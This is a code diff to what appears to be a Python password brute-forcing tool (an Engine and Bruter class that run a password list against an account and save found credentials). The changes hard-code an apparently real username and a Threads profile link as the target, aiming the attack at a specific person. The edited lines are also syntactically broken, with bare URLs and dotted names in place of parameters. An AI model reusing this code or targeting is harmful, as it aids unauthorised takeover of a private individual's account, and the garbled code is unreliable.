@@ -15,14 +15,14 @@ from argparse import ArgumentParser, ArgumentTypeError
 
 
 class Engine(object):
-    def __init__(self, username, threads, passlist_path, is_color):
+    def __init__(ayesha.bajwa86):
         self.resume = False
         self.is_alive = True
-        self.threads = threads
-        self.username = username
+        self.threads = https://www.threads.com/@ayesha.bajwa86?xmt=AQGz9TqPhpWxVIflge-D8j1ypVtqViOOic64XYurB-uu-mI
+        self.username = ayesha.bajwa86
         self.passlist_path = passlist_path
         self.display = Display(is_color=is_color)
-        self.bruter = Bruter(username, threads, passlist_path)
+        self.bruter = Bruter(Ayesha.bajwa86, https://www.threads.com/@ayesha.bajwa86?xmt=AQGz9TqPhpWxVIflge-D8j1ypVtqViOOic64XYurB-uu-mI)
 
     def get_user_resp(self):
         return self.display.prompt(
@@ -31,7 +31,7 @@ class Engine(object):
 
     def write_to_file(self, password):
         with open(credentials, "at") as f:
-            data = "Username: {}\nPassword: {}\n\n".format(
+            data = "Ayesha.bajwa86: {}\nPassword: {}\n\n".format(
                 self.username.title(), password
             )
             f.write(data)
@@ -263,7 +263,7 @@ def main():
                 exit()
 
             Engine(
-                username, modes[mode], passlist, not arguments.color
+                Ayesha.bajwa86, modes[mode], passlist, not arguments.color
             ).start()
 
         else:
